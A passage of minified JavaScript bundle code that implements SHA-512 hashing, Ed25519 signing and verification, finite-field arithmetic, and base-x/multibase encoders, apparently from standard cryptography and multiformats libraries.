zm{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:n,Bh:r,Bl:i,Ch:s,Cl:o,Dh:a,Dl:c,Eh:l,El:u,Fh:h,Fl:f,Gh:p,Gl:d,Hh:g,Hl:w}=this;return[e,n,r,i,s,o,a,c,l,u,h,f,p,d,g,w]}set(e,n,r,i,s,o,a,c,l,u,h,f,p,d,g,w){this.Ah=e|0,this.Al=n|0,this.Bh=r|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=l|0,this.El=u|0,this.Fh=h|0,this.Fl=f|0,this.Gh=p|0,this.Gl=d|0,this.Hh=g|0,this.Hl=w|0}process(e,n){for(let v=0;v<16;v++,n+=4)un[v]=e.getUint32(n),hn[v]=e.getUint32(n+=4);for(let v=16;v<80;v++){const b=un[v-15]|0,x=hn[v-15]|0,O=X.rotrSH(b,x,1)^X.rotrSH(b,x,8)^X.shrSH(b,x,7),B=X.rotrSL(b,x,1)^X.rotrSL(b,x,8)^X.shrSL(b,x,7),k=un[v-2]|0,$=hn[v-2]|0,N=X.rotrSH(k,$,19)^X.rotrBH(k,$,61)^X.shrSH(k,$,6),E=X.rotrSL(k,$,19)^X.rotrBL(k,$,61)^X.shrSL(k,$,6),S=X.add4L(B,E,hn[v-7],hn[v-16]),D=X.add4H(S,O,N,un[v-7],un[v-16]);un[v]=D|0,hn[v]=S|0}let{Ah:r,Al:i,Bh:s,Bl:o,Ch:a,Cl:c,Dh:l,Dl:u,Eh:h,El:f,Fh:p,Fl:d,Gh:g,Gl:w,Hh:_,Hl:C}=this;for(let v=0;v<80;v++){const b=X.rotrSH(h,f,14)^X.rotrSH(h,f,18)^X.rotrBH(h,f,41),x=X.rotrSL(h,f,14)^X.rotrSL(h,f,18)^X.rotrBL(h,f,41),O=h&p^~h&g,B=f&d^~f&w,k=X.add5L(C,x,B,fw[v],hn[v]),$=X.add5H(k,_,b,O,hw[v],un[v]),N=k|0,E=X.rotrSH(r,i,28)^X.rotrBH(r,i,34)^X.rotrBH(r,i,39),S=X.rotrSL(r,i,28)^X.rotrBL(r,i,34)^X.rotrBL(r,i,39),D=r&s^r&a^s&a,P=i&o^i&c^o&c;_=g|0,C=w|0,g=p|0,w=d|0,p=h|0,d=f|0,{h,l:f}=X.add(l|0,u|0,$|0,N|0),l=a|0,u=c|0,a=s|0,c=o|0,s=r|0,o=i|0;const y=X.add3L(N,S,P);r=X.add3H(y,$,E,D),i=y|0}({h:r,l:i}=X.add(this.Ah|0,this.Al|0,r|0,i|0)),{h:s,l:o}=X.add(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=X.add(this.Ch|0,this.Cl|0,a|0,c|0),{h:l,l:u}=X.add(this.Dh|0,this.Dl|0,l|0,u|0),{h,l:f}=X.add(this.Eh|0,this.El|0,h|0,f|0),{h:p,l:d}=X.add(this.Fh|0,this.Fl|0,p|0,d|0),{h:g,l:w}=X.add(this.Gh|0,this.Gl|0,g|0,w|0),{h:_,l:C}=X.add(this.Hh|0,this.Hl|0,_|0,C|0),this.set(r,i,s,o,a,c,l,u,h,f,p,d,g,w,_,C)}roundClean(){un.fill(0),hn.fill(0)}destroy(){this.buffer.fill(0),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}};const pw=jm(()=>new dw);const _c=BigInt(0),ed=BigInt(1),gw=BigInt(2);function Ic(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Sc(t){if(!Ic(t))throw new Error("Uint8Array expected")}function _o(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const yw=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Dc(t){Sc(t);let e="";for(let n=0;n<t.length;n++)e+=yw[t[n]];return e}function td(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?_c:BigInt("0x"+t)}const Wt={_0:48,_9:57,A:65,F:70,a:97,f:102};function Gl(t){if(t>=Wt._0&&t<=Wt._9)return t-Wt._0;if(t>=Wt.A&&t<=Wt.F)return t-(Wt.A-10);if(t>=Wt.a&&t<=Wt.f)return t-(Wt.a-10)}function nd(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,s=0;i<n;i++,s+=2){const o=Gl(t.charCodeAt(s)),a=Gl(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}r[i]=o*16+a}return r}function mw(t){return td(Dc(t))}function hs(t){return Sc(t),td(Dc(Uint8Array.from(t).reverse()))}function rd(t,e){return nd(t.toString(16).padStart(e*2,"0"))}function Ia(t,e){return rd(t,e).reverse()}function Kt(t,e,n){let r;if(typeof e=="string")try{r=nd(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(Ic(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}function Yl(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Sc(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const s=t[r];n.set(s,i),i+=s.length}return n}const Io=t=>typeof t=="bigint"&&_c<=t;function ww(t,e,n){return Io(t)&&Io(e)&&Io(n)&&e<=t&&t<n}function Gr(t,e,n,r){if(!ww(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function bw(t){let e;for(e=0;t>_c;t>>=ed,e+=1);return e}const vw=t=>(gw<<BigInt(t-1))-ed,Ew={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||Ic(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function Ac(t,e,n={}){const r=(i,s,o)=>{const a=Ew[s];if(typeof a!="function")throw new Error("invalid validator function");const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+c)};for(const[i,s]of Object.entries(e))r(i,s,!1);for(const[i,s]of Object.entries(n))r(i,s,!0);return t}function Zl(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const s=t(n,...r);return e.set(n,s),s}}const Ce=BigInt(0),ge=BigInt(1),Wn=BigInt(2),xw=BigInt(3),Sa=BigInt(4),Xl=BigInt(5),Jl=BigInt(8);function xe(t,e){const n=t%e;return n>=Ce?n:e+n}function _w(t,e,n){if(e<Ce)throw new Error("invalid exponent, negatives unsupported");if(n<=Ce)throw new Error("invalid modulus");if(n===ge)return Ce;let r=ge;for(;e>Ce;)e&ge&&(r=r*t%n),t=t*t%n,e>>=ge;return r}function Bt(t,e,n){let r=t;for(;e-- >Ce;)r*=r,r%=n;return r}function Ql(t,e){if(t===Ce)throw new Error("invert: expected non-zero number");if(e<=Ce)throw new Error("invert: expected positive modulus, got "+e);let n=xe(t,e),r=e,i=Ce,s=ge;for(;n!==Ce;){const o=r/n,a=r%n,c=i-s*o;r=n,n=a,i=s,s=c}if(r!==ge)throw new Error("invert: does not exist");return xe(i,e)}function Iw(t){const e=(t-ge)/Wn;let n,r,i;for(n=t-ge,r=0;n%Wn===Ce;n/=Wn,r++);for(i=Wn;i<t&&_w(i,e,t)!==t-ge;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(r===1){const o=(t+ge)/Sa;return function(a,c){const l=a.pow(c,o);if(!a.eql(a.sqr(l),c))throw new Error("Cannot find square root");return l}}const s=(n+ge)/Wn;return function(o,a){if(o.pow(a,e)===o.neg(o.ONE))throw new Error("Cannot find square root");let c=r,l=o.pow(o.mul(o.ONE,i),n),u=o.pow(a,s),h=o.pow(a,n);for(;!o.eql(h,o.ONE);){if(o.eql(h,o.ZERO))return o.ZERO;let f=1;for(let d=o.sqr(h);f<c&&!o.eql(d,o.ONE);f++)d=o.sqr(d);const p=o.pow(l,ge<<BigInt(c-f-1));l=o.sqr(p),u=o.mul(u,p),h=o.mul(h,l),c=f}return u}}function Sw(t){if(t%Sa===xw){const e=(t+ge)/Sa;return function(n,r){const i=n.pow(r,e);if(!n.eql(n.sqr(i),r))throw new Error("Cannot find square root");return i}}if(t%Jl===Xl){const e=(t-Xl)/Jl;return function(n,r){const i=n.mul(r,Wn),s=n.pow(i,e),o=n.mul(r,s),a=n.mul(n.mul(o,Wn),s),c=n.mul(o,n.sub(a,n.ONE));if(!n.eql(n.sqr(c),r))throw new Error("Cannot find square root");return c}}return Iw(t)}const Dw=(t,e)=>(xe(t,e)&ge)===ge,Aw=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function Ow(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},n=Aw.reduce((r,i)=>(r[i]="function",r),e);return Ac(t,n)}function $w(t,e,n){if(n<Ce)throw new Error("invalid exponent, negatives unsupported");if(n===Ce)return t.ONE;if(n===ge)return e;let r=t.ONE,i=e;for(;n>Ce;)n&ge&&(r=t.mul(r,i)),i=t.sqr(i),n>>=ge;return r}function Cw(t,e){const n=new Array(e.length),r=e.reduce((s,o,a)=>t.is0(o)?s:(n[a]=s,t.mul(s,o)),t.ONE),i=t.inv(r);return e.reduceRight((s,o,a)=>t.is0(o)?s:(n[a]=t.mul(s,n[a]),t.mul(s,o)),i),n}function id(t,e){const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function sd(t,e,n=!1,r={}){if(t<=Ce)throw new Error("invalid field: expected ORDER > 0, got "+t);const{nBitLength:i,nByteLength:s}=id(t,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:t,isLE:n,BITS:i,BYTES:s,MASK:vw(i),ZERO:Ce,ONE:ge,create:c=>xe(c,t),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return Ce<=c&&c<t},is0:c=>c===Ce,isOdd:c=>(c&ge)===ge,neg:c=>xe(-c,t),eql:(c,l)=>c===l,sqr:c=>xe(c*c,t),add:(c,l)=>xe(c+l,t),sub:(c,l)=>xe(c-l,t),mul:(c,l)=>xe(c*l,t),pow:(c,l)=>$w(a,c,l),div:(c,l)=>xe(c*Ql(l,t),t),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>Ql(c,t),sqrt:r.sqrt||(c=>(o||(o=Sw(t)),o(a,c))),invertBatch:c=>Cw(a,c),cmov:(c,l,u)=>u?l:c,toBytes:c=>n?Ia(c,s):rd(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return n?hs(c):mw(c)}});return Object.freeze(a)}const eu=BigInt(0),Gi=BigInt(1);function So(t,e){const n=e.negate();return t?n:e}function od(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function Do(t,e){od(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1);return{windows:n,windowSize:r}}function Pw(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function Tw(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const Ao=new WeakMap,ad=new WeakMap;function Oo(t){return ad.get(t)||1}function Bw(t,e){return{constTimeNegate:So,hasPrecomputes(n){return Oo(n)!==1},unsafeLadder(n,r,i=t.ZERO){let s=n;for(;r>eu;)r&Gi&&(i=i.add(s)),s=s.double(),r>>=Gi;return i},precomputeWindow(n,r){const{windows:i,windowSize:s}=Do(r,e),o=[];let a=n,c=a;for(let l=0;l<i;l++){c=a,o.push(c);for(let u=1;u<s;u++)c=c.add(a),o.push(c);a=c.double()}return o},wNAF(n,r,i){const{windows:s,windowSize:o}=Do(n,e);let a=t.ZERO,c=t.BASE;const l=BigInt(2**n-1),u=2**n,h=BigInt(n);for(let f=0;f<s;f++){const p=f*o;let d=Number(i&l);i>>=h,d>o&&(d-=u,i+=Gi);const g=p,w=p+Math.abs(d)-1,_=f%2!==0,C=d<0;d===0?c=c.add(So(_,r[g])):a=a.add(So(C,r[w]))}return{p:a,f:c}},wNAFUnsafe(n,r,i,s=t.ZERO){const{windows:o,windowSize:a}=Do(n,e),c=BigInt(2**n-1),l=2**n,u=BigInt(n);for(let h=0;h<o;h++){const f=h*a;if(i===eu)break;let p=Number(i&c);if(i>>=u,p>a&&(p-=l,i+=Gi),p===0)continue;let d=r[f+Math.abs(p)-1];p<0&&(d=d.negate()),s=s.add(d)}return s},getPrecomputes(n,r,i){let s=Ao.get(r);return s||(s=this.precomputeWindow(r,n),n!==1&&Ao.set(r,i(s))),s},wNAFCached(n,r,i){const s=Oo(n);return this.wNAF(s,this.getPrecomputes(s,n,i),r)},wNAFCachedUnsafe(n,r,i,s){const o=Oo(n);return o===1?this.unsafeLadder(n,r,s):this.wNAFUnsafe(o,this.getPrecomputes(o,n,i),r,s)},setWindowSize(n,r){od(r,e),ad.set(n,r),Ao.delete(n)}}}function Rw(t,e,n,r){if(Pw(n,t),Tw(r,e),n.length!==r.length)throw new Error("arrays of points and scalars must have equal length");const i=t.ZERO,s=bw(BigInt(n.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,c=new Array(a+1).fill(i),l=Math.floor((e.BITS-1)/o)*o;let u=i;for(let h=l;h>=0;h-=o){c.fill(i);for(let p=0;p<r.length;p++){const d=r[p],g=Number(d>>BigInt(h)&BigInt(a));c[g]=c[g].add(n[p])}let f=i;for(let p=c.length-1,d=i;p>0;p--)d=d.add(c[p]),f=f.add(d);if(u=u.add(f),h!==0)for(let p=0;p<o;p++)u=u.double()}return u}function kw(t){return Ow(t.Fp),Ac(t,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...id(t.n,t.nBitLength),...t,p:t.Fp.ORDER})}const It=BigInt(0),Ze=BigInt(1),Yi=BigInt(2),Nw=BigInt(8),Uw={zip215:!0};function Mw(t){const e=kw(t);return Ac(t,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}function Lw(t){const e=Mw(t),{Fp:n,n:r,prehash:i,hash:s,randomBytes:o,nByteLength:a,h:c}=e,l=Yi<<BigInt(a*8)-Ze,u=n.create,h=sd(e.n,e.nBitLength),f=e.uvRatio||((y,m)=>{try{return{isValid:!0,value:n.sqrt(y*n.inv(m))}}catch{return{isValid:!1,value:It}}}),p=e.adjustScalarBytes||(y=>y),d=e.domain||((y,m,I)=>{if(_o("phflag",I),m.length||I)throw new Error("Contexts/pre-hash are not supported");return y});function g(y,m){Gr("coordinate "+y,m,It,l)}function w(y){if(!(y instanceof v))throw new Error("ExtendedPoint expected")}const _=Zl((y,m)=>{const{ex:I,ey:T,ez:A}=y,R=y.is0();m==null&&(m=R?Nw:n.inv(A));const U=u(I*m),M=u(T*m),q=u(A*m);if(R)return{x:It,y:Ze};if(q!==Ze)throw new Error("invZ was invalid");return{x:U,y:M}}),C=Zl(y=>{const{a:m,d:I}=e;if(y.is0())throw new Error("bad point: ZERO");const{ex:T,ey:A,ez:R,et:U}=y,M=u(T*T),q=u(A*A),L=u(R*R),j=u(L*L),K=u(M*m),G=u(L*u(K+q)),Z=u(j+u(I*u(M*q)));if(G!==Z)throw new Error("bad point: equation left != right (1)");const H=u(T*A),Y=u(R*U);if(H!==Y)throw new Error("bad point: equation left != right (2)");return!0});class v{constructor(m,I,T,A){this.ex=m,this.ey=I,this.ez=T,this.et=A,g("x",m),g("y",I),g("z",T),g("t",A),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(m){if(m instanceof v)throw new Error("extended point not allowed");const{x:I,y:T}=m||{};return g("x",I),g("y",T),new v(I,T,Ze,u(I*T))}static normalizeZ(m){const I=n.invertBatch(m.map(T=>T.ez));return m.map((T,A)=>T.toAffine(I[A])).map(v.fromAffine)}static msm(m,I){return Rw(v,h,m,I)}_setWindowSize(m){O.setWindowSize(this,m)}assertValidity(){C(this)}equals(m){w(m);const{ex:I,ey:T,ez:A}=this,{ex:R,ey:U,ez:M}=m,q=u(I*M),L=u(R*A),j=u(T*M),K=u(U*A);return q===L&&j===K}is0(){return this.equals(v.ZERO)}negate(){return new v(u(-this.ex),this.ey,this.ez,u(-this.et))}double(){const{a:m}=e,{ex:I,ey:T,ez:A}=this,R=u(I*I),U=u(T*T),M=u(Yi*u(A*A)),q=u(m*R),L=I+T,j=u(u(L*L)-R-U),K=q+U,G=K-M,Z=q-U,H=u(j*G),Y=u(K*Z),te=u(j*Z),ue=u(G*K);return new v(H,Y,ue,te)}add(m){w(m);const{a:I,d:T}=e,{ex:A,ey:R,ez:U,et:M}=this,{ex:q,ey:L,ez:j,et:K}=m;if(I===BigInt(-1)){const il=u((R-A)*(L+q)),sl=u((R+A)*(L-q)),lo=u(sl-il);if(lo===It)return this.double();const ol=u(U*Yi*K),al=u(M*Yi*j),cl=al+ol,ll=sl+il,ul=al-ol,Jg=u(cl*lo),Qg=u(ll*ul),ey=u(cl*ul),ty=u(lo*ll);return new v(Jg,Qg,ty,ey)}const G=u(A*q),Z=u(R*L),H=u(M*T*K),Y=u(U*j),te=u((A+R)*(q+L)-G-Z),ue=Y-H,pe=Y+H,ye=u(Z-I*G),at=u(te*ue),Nn=u(pe*ye),Un=u(te*ye),dr=u(ue*pe);return new v(at,Nn,dr,Un)}subtract(m){return this.add(m.negate())}wNAF(m){return O.wNAFCached(this,m,v.normalizeZ)}multiply(m){const I=m;Gr("scalar",I,Ze,r);const{p:T,f:A}=this.wNAF(I);return v.normalizeZ([T,A])[0]}multiplyUnsafe(m,I=v.ZERO){const T=m;return Gr("scalar",T,It,r),T===It?x:this.is0()||T===Ze?this:O.wNAFCachedUnsafe(this,T,v.normalizeZ,I)}isSmallOrder(){return this.multiplyUnsafe(c).is0()}isTorsionFree(){return O.unsafeLadder(this,r).is0()}toAffine(m){return _(this,m)}clearCofactor(){const{h:m}=e;return m===Ze?this:this.multiplyUnsafe(m)}static fromHex(m,I=!1){const{d:T,a:A}=e,R=n.BYTES;m=Kt("pointHex",m,R),_o("zip215",I);const U=m.slice(),M=m[R-1];U[R-1]=M&-129;const q=hs(U),L=I?l:n.ORDER;Gr("pointHex.y",q,It,L);const j=u(q*q),K=u(j-Ze),G=u(T*j-A);let{isValid:Z,value:H}=f(K,G);if(!Z)throw new Error("Point.fromHex: invalid y coordinate");const Y=(H&Ze)===Ze,te=(M&128)!==0;if(!I&&H===It&&te)throw new Error("Point.fromHex: x=0 and x_0=1");return te!==Y&&(H=u(-H)),v.fromAffine({x:H,y:q})}static fromPrivateKey(m){return $(m).point}toRawBytes(){const{x:m,y:I}=this.toAffine(),T=Ia(I,n.BYTES);return T[T.length-1]|=m&Ze?128:0,T}toHex(){return Dc(this.toRawBytes())}}v.BASE=new v(e.Gx,e.Gy,Ze,u(e.Gx*e.Gy)),v.ZERO=new v(It,Ze,Ze,It);const{BASE:b,ZERO:x}=v,O=Bw(v,a*8);function B(y){return xe(y,r)}function k(y){return B(hs(y))}function $(y){const m=n.BYTES;y=Kt("private key",y,m);const I=Kt("hashed private key",s(y),2*m),T=p(I.slice(0,m)),A=I.slice(m,2*m),R=k(T),U=b.multiply(R),M=U.toRawBytes();return{head:T,prefix:A,scalar:R,point:U,pointBytes:M}}function N(y){return $(y).pointBytes}function E(y=new Uint8Array,...m){const I=Yl(...m);return k(s(d(I,Kt("context",y),!!i)))}function S(y,m,I={}){y=Kt("message",y),i&&(y=i(y));const{prefix:T,scalar:A,pointBytes:R}=$(m),U=E(I.context,T,y),M=b.multiply(U).toRawBytes(),q=E(I.context,M,R,y),L=B(U+q*A);Gr("signature.s",L,It,r);const j=Yl(M,Ia(L,n.BYTES));return Kt("result",j,n.BYTES*2)}const D=Uw;function P(y,m,I,T=D){const{context:A,zip215:R}=T,U=n.BYTES;y=Kt("signature",y,2*U),m=Kt("message",m),I=Kt("publicKey",I,U),R!==void 0&&_o("zip215",R),i&&(m=i(m));const M=hs(y.slice(U,2*U));let q,L,j;try{q=v.fromHex(I,R),L=v.fromHex(y.slice(0,U),R),j=b.multiplyUnsafe(M)}catch{return!1}if(!R&&q.isSmallOrder())return!1;const K=E(A,L.toRawBytes(),q.toRawBytes(),m);return L.add(q.multiplyUnsafe(K)).subtract(j).clearCofactor().equals(v.ZERO)}return b._setWindowSize(8),{CURVE:e,getPublicKey:N,sign:S,verify:P,ExtendedPoint:v,utils:{getExtendedPublicKey:$,randomPrivateKey:()=>o(n.BYTES),precompute(y=8,m=v.BASE){return m._setWindowSize(y),m.multiply(BigInt(3)),m}}}}BigInt(0),BigInt(1);const Oc=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),tu=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");BigInt(0);const Fw=BigInt(1),nu=BigInt(2);BigInt(3);const jw=BigInt(5),qw=BigInt(8);function zw(t){const e=BigInt(10),n=BigInt(20),r=BigInt(40),i=BigInt(80),s=Oc,o=t*t%s*t%s,a=Bt(o,nu,s)*o%s,c=Bt(a,Fw,s)*t%s,l=Bt(c,jw,s)*c%s,u=Bt(l,e,s)*l%s,h=Bt(u,n,s)*u%s,f=Bt(h,r,s)*h%s,p=Bt(f,i,s)*f%s,d=Bt(p,i,s)*f%s,g=Bt(d,e,s)*l%s;return{pow_p_5_8:Bt(g,nu,s)*t%s,b2:o}}function Vw(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}function Ww(t,e){const n=Oc,r=xe(e*e*e,n),i=xe(r*r*e,n),s=zw(t*i).pow_p_5_8;let o=xe(t*r*s,n);const a=xe(e*o*o,n),c=o,l=xe(o*tu,n),u=a===t,h=a===xe(-t,n),f=a===xe(-t*tu,n);return u&&(o=c),(h||f)&&(o=l),Dw(o,n)&&(o=xe(-o,n)),{isValid:u||h,value:o}}const Kw=sd(Oc,void 0,!0),Hw={a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:Kw,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:qw,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:pw,randomBytes:Jf,adjustScalarBytes:Vw,uvRatio:Ww},cd=Lw(Hw),Gw="EdDSA",Yw="JWT",xs=".",Vs="base64url",ld="utf8",ud="utf8",Zw=":",Xw="did",Jw="key",ru="base58btc",Qw="z",eb="K36",tb=32;function $c(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function hd(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?$c(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function fd(t,e){e||(e=t.reduce((i,s)=>i+s.length,0));const n=hd(e);let r=0;for(const i of t)n.set(i,r),r+=i.length;return $c(n)}function nb(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(n[o]!==255)throw new TypeError(s+" is ambiguous");n[o]=i}var a=t.length,c=t.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function h(d){if(d instanceof Uint8Array||(ArrayBuffer.isView(d)?d=new Uint8Array(d.buffer,d.byteOffset,d.byteLength):Array.isArray(d)&&(d=Uint8Array.from(d))),!(d instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(d.length===0)return"";for(var g=0,w=0,_=0,C=d.length;_!==C&&d[_]===0;)_++,g++;for(var v=(C-_)*u+1>>>0,b=new Uint8Array(v);_!==C;){for(var x=d[_],O=0,B=v-1;(x!==0||O<w)&&B!==-1;B--,O++)x+=256*b[B]>>>0,b[B]=x%a>>>0,x=x/a>>>0;if(x!==0)throw new Error("Non-zero carry");w=O,_++}for(var k=v-w;k!==v&&b[k]===0;)k++;for(var $=c.repeat(g);k<v;++k)$+=t.charAt(b[k]);return $}function f(d){if(typeof d!="string")throw new TypeError("Expected String");if(d.length===0)return new Uint8Array;var g=0;if(d[g]!==" "){for(var w=0,_=0;d[g]===c;)w++,g++;for(var C=(d.length-g)*l+1>>>0,v=new Uint8Array(C);d[g];){var b=n[d.charCodeAt(g)];if(b===255)return;for(var x=0,O=C-1;(b!==0||x<_)&&O!==-1;O--,x++)b+=a*v[O]>>>0,v[O]=b%256>>>0,b=b/256>>>0;if(b!==0)throw new Error("Non-zero carry");_=x,g++}if(d[g]!==" "){for(var B=C-_;B!==C&&v[B]===0;)B++;for(var k=new Uint8Array(w+(C-B)),$=w;B!==C;)k[$++]=v[B++];return k}}}function p(d){var g=f(d);if(g)return g;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:f,decode:p}}var rb=nb,ib=rb;const dd=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},sb=t=>new TextEncoder().encode(t),ob=t=>new TextDecoder().decode(t);let ab=class{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},cb=class{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return pd(this,e)}},lb=class{constructor(e){this.decoders=e}or(e){return pd(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}};const pd=(t,e)=>new lb({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});let ub=class{constructor(e,n,r,i){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=i,this.encoder=new ab(e,n,r),this.decoder=new cb(e,n,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}};const Ws=({name:t,prefix:e,encode:n,decode:r})=>new ub(t,e,n,r),Pi=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:i}=ib(n,e);return Ws({prefix:t,name:e,encode:r,decode:s=>dd(i(s))})},hb=(t,e,n,r)=>{const i={};for(let u=0;u<e.length;++u)i[e[u]]=u;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*n/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const h=i[t[u]];if(h===void 0)throw new SyntaxError(`Non-${r} character`);c=c<<n|h,a+=n,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=n||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},fb=(t,e,n)=>{const r=e[e.length-1]==="=",i=(1<<n)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>n;)o-=n,s+=e[i&a>>o];if(o&&(s+=e[i&a<<n-o]),r)for(;s.length*n&7;)s+="=";return s},Ne=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>Ws({prefix:e,name:t,encode(i){return fb(i,r,n)},decode(i){return hb(i,r,n,t)}}),db=Ws({prefix:"\0",name:"identity",encode:t=>ob(t),decode:t=>sb(t)});var pb=Object.freeze({__proto__:null,identity:db});const gb=Ne({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var yb=Object.freeze({__proto__:null,base2:gb});const mb=Ne({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var wb=Object.freeze({__proto__:null,base8:mb});const bb=Pi({prefix:"9",name:"base10",alphabet:"0123456789"});var vb=Object.freeze({__proto__:null,base10:bb});const Eb=Ne({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),xb=Ne({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var _b=Object.freeze({__proto__:null,base16:Eb,base16upper:xb});const 